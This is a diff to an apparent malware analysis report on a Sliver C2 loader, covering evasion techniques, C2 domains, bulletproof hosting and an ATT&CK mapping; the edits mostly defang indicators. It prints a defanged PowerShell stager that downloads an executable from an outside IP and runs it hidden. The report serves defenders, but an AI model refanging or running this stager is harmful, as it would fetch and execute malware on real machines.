@@ -91,7 +91,7 @@ Defenders can act now on the certificate serial `659EEB5AA4A489FB238993AF259D23F
 4. **SysWhispers3 HalosGate indirect syscalls**: Six NT functions bypassed at the direct syscall level; EDRs relying solely on usermode ntdll hook telemetry are blind to process injection operations.
 5. **Sliver C2 with three-endpoint resilience**: mTLS (mutual TLS, a two-way encryption and authentication protocol) beaconing to `mailuxe[.]net` and `mailmassange[.]duckdns[.]org`; random endpoint selection defeats single-domain blocking; 2027 killswitch indicates planned multi-year operation.
 6. **Process hollowing into sihost.exe** (process hollowing is a technique where the malware hides itself inside a trusted Windows system process, making it invisible to detection tools): process hollowing as the active injection mode is DEFINITE (XZ config header mode byte 0x04, confirmed in dynamic analysis); the `sihost.exe` target process is MODERATE confidence (75%) from build.log, not confirmed in live analysis. sihost.exe is a trusted Shell Infrastructure Host, outbound connections from it to non-Microsoft addresses are anomalous and high-value hunt leads regardless of which process the actual runtime target proves to be.
-7. **Bulletproof hosting confirmed**: 1337 Services GmbH co-founders linked to DOJ Operation Talent (Cracked[.]to/Nulled.to seizure); threat intelligence feeds flag AS210558 as presumptively malicious infrastructure.
+7. **Bulletproof hosting confirmed**: 1337 Services GmbH co-founders linked to DOJ Operation Talent (Cracked[.]to/Nulled[.]to seizure); threat intelligence feeds flag AS210558 as presumptively malicious infrastructure.
 8. **Build pipeline fingerprint survives rebuilds**: SysWhispers3 hash seed `0x9DEA8D94`, stub/implemented module architecture, and the `MicrosoftEdgeUpdate.exe` PEB spoofing string are compiled constants detectable across polymorphic builds.
 9. **Stager-loader skill gap**: The stager uses one of the most widely detected AMSI bypass techniques alongside a loader with HalosGate indirect syscalls, a strong indicator of two-party development (access broker + custom toolkit builder).
 10. **Pre-deployment discovery**: Infrastructure indexed approximately 6.75 hours after build completion, likely before confirmed victim compromise.
@@ -248,7 +248,7 @@ Silent failure if insufficient privileges. If successful, triggers Windows Event
 $url="hxxp://45[.]94[.]31[.]220:8000/OneDriveSync.exe"
 $p="$env:TEMP\update.exe"
 ([N]ew-Object Net.WebClient).DownloadFile($url,$p)
-Start-Process $p -WindowStyle Hidden
+[S]tart-Process $p -WindowStyle Hidden
 ```
 
 Downloads `OneDriveSync.exe` over unencrypted HTTP from port 8000. Writes to `%TEMP%\update.exe`. Executes hidden. The beacon lands on disk at this stage, a recoverable forensic artifact.
@@ -891,7 +891,7 @@ The toolchain characteristics, infrastructure choices, and operational behaviors
 | Discovery            | T1057        | Process Discovery                            | MODERATE (60%) | ppid_spoof.C includes tlhelp32.h; PPID spoofing requires process enumeration                                                        |
 | Command and Control  | T1071.001    | Web Protocols                                | HIGH           | Sliver --http mailuxe[.]net:443, --http mailmassange[.]duckdns[.]org:443, --http mailuxe[.]net:8443                                         |
 | Command and Control  | T1573.002    | Asymmetric Cryptography                      | HIGH           | Sliver mTLS (mutual TLS) for C2 channel; confirmed by --http flag and Sliver default                                                |
-| Command and Control  | T1105        | Ingress Tool Transfer                        | DEFINITE       | stager DownloadFile from [hxxp[:]//45[.]94[.]31[.]220:8000/OneDriveSync[.]exe](hxxp://45.94.31[.]220:8000/OneDriveSync[.]exe) → %TEMP%\update.exe |
+| Command and Control  | T1105        | Ingress Tool Transfer                        | DEFINITE       | stager DownloadFile from hxxp[:]//45[.]94[.]31[.]220:8000/OneDriveSync[.]exe → %TEMP%\update.exe |
 
 
 On persistence, T1547.001 (Registry Run Keys) was assessed and NOT observed. Behavioral sandbox analysis recorded zero registry writes by the sample, and memory forensics found no persistence keys. Persistence is operator-deployed after C2 establishment rather than loader-automated.
